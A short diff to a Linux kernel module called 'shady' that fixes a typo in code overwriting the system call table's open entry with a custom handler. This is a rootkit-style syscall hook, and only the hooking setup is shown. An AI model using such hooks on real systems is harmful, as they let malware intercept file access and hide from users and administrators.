@@ -276,7 +276,7 @@ shady_init_module(void)
 
   set_addr_rw(system_call_table_address);
   sct = (void **)system_call_table_address;
-  old_open = scr[__NR_open];
+  old_open = sct[__NR_open];
   sct[__NR_open] = my_open; 
   return 0; /* success */
 
